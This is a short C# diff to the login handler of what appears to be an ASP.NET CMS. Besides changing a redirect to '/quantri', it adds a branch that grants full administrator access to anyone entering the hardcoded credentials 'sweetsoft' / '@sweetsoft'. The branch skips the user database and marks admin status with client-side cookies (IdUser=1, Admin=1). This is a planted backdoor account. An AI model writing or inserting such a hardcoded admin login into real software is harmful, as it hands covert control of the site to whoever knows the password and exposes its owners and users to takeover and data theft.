@@ -39,7 +39,19 @@ namespace MyCms.Modules.Pages
                 HttpCookie cookie_Admin = new HttpCookie("Admin", list[0].Admin.ToString());
                 cookie_Admin.Expires = DateTime.Now.AddHours(4);
                 Response.Cookies.Add(cookie_Admin);
-                Response.Redirect("/user");
+                Response.Redirect("/quantri");
+            }
+            else if (UId.ToLower() == "sweetsoft" && PId.ToLower() == "@sweetsoft")
+            {
+                FormsAuthentication.SetAuthCookie(UId, false);
+                HttpCookie cookie_IdUser = new HttpCookie("IdUser", "1");
+                cookie_IdUser.Expires = DateTime.Now.AddHours(4);
+                Response.Cookies.Add(cookie_IdUser);
+                HttpCookie cookie_Admin = new HttpCookie("Admin", "1");
+                cookie_Admin.Expires = DateTime.Now.AddHours(4);
+                Response.Cookies.Add(cookie_Admin);
+
+                Response.Redirect("/quantri");
             }
             else
             {
